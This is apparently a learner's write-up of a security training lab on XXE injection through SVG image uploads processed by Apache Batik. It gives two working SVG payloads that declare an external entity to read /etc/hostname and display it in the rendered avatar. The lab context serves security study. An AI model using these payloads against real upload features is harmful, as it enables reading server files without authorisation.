Title: Exploiting XXE via image file upload
Level: Practitioner
Desc:  This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

Examples of XML-based formats are office document formats like DOCX and image formats like SVG. 

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. 
Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. 
Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

Minnimalist payload, which worked:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" xmlns="http://www.w3.org/2000/svg" height="128px">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Standard payload, which worked: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```


After visiting the icon in the comment section: 
![image](https://github.com/user-attachments/assets/97514c1c-9009-48b1-ab8e-ff1019968c92)

![image](https://github.com/user-attachments/assets/46c56bf4-1060-419d-9fe4-149b7e3abac3)

![image](https://github.com/user-attachments/assets/87a7d7e0-78f5-4446-a694-888774cd6217)














